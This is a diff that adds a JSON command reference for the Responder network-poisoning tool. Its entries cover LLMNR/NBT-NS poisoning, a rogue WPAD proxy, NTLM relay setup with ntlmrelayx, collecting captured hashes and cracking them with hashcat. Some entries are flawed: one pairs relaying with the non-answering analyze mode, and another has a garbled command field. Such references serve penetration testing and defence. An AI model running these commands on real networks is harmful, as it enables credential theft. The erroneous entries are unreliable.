@@ -1,0 +1,81 @@
+{
+  "tool": "responder",
+  "name": "Responder",
+  "description": "An LLMNR, NBT-NS and mDNS poisoner that captures Windows authentication hashes on a local network, and a staging ground for NTLM relay attacks.",
+  "tags": [
+    "Active Directory",
+    "NTLM",
+    "poisoning",
+    "MITM"
+  ],
+  "homepage": "https://github.com/lgandx/Responder",
+  "docs": "https://github.com/lgandx/Responder",
+  "install": {
+    "apt": "sudo apt install responder",
+    "pipx": "pipx install git+https://github.com/lgandx/Responder"
+  },
+  "related": [
+    "impacket",
+    "crackmapexec",
+    "hashcat"
+  ],
+  "total_commands": 8,
+  "commands": [
+    {
+      "id": 1,
+      "category": "Poisoning",
+      "command": "sudo responder -I <iface>",
+      "example": "sudo responder -I eth0",
+      "explanation": "Answers LLMNR, NBT-NS and mDNS queries to capture NetNTLM hashes from hosts looking up bad names."
+    },
+    {
+      "id": 2,
+      "category": "Poisoning",
+      "command": "sudo responder -I <iface> -w",
+      "example": "sudo responder -I eth0 -w",
+      "explanation": "Also starts the rogue WPAD proxy to capture HTTP authentication."
+    },
+    {
+      "id": 3,
+      "category": "Poisoning",
+      "command": "sudo responder -I <iface> -dw",
+      "example": "sudo responder -I eth0 -dwv",
+      "explanation": "Enables answers for more query types plus verbose output."
+    },
+    {
+      "id": 4,
+      "category": "Poisoning",
+      "command": "sudo responder -I <iface> -A",
+      "example": "sudo responder -I eth0 -A",
+      "explanation": "Analyze mode: watches and logs poisoning opportunities without actually answering — safe for recon."
+    },
+    {
+      "id": 5,
+      "category": "Relaying setup",
+      "command": "sudo responder -I <iface> with SMB=Off, HTTP=Off in Responder.conf",
+      "example": "sudo nano /usr/share/responder/Responder.conf",
+      "explanation": "Turn the SMB and HTTP servers off so ntlmrelayx can bind them for relaying."
+    },
+    {
+      "id": 6,
+      "category": "Relaying setup",
+      "command": "sudo responder -I <iface> -A then run ntlmrelayx.py -tf targets.txt",
+      "example": "sudo responder -I eth0 -A",
+      "explanation": "Pairs Responder (listening only) with Impacket ntlmrelayx to relay captured auth."
+    },
+    {
+      "id": 7,
+      "category": "Loot",
+      "command": "ls /usr/share/responder/logs/",
+      "example": "ls /usr/share/responder/logs/",
+      "explanation": "Captured NetNTLMv1/v2 hashes are written here, one file per protocol and host."
+    },
+    {
+      "id": 8,
+      "category": "Loot",
+      "command": "hashcat -m 5600 <hashfile> <wordlist>",
+      "example": "hashcat -m 5600 logs/SMB-NTLMv2-SSP-10.10.10.7.txt rockyou.txt",
+      "explanation": "Cracks captured NetNTLMv2 hashes."
+    }
+  ]
+}
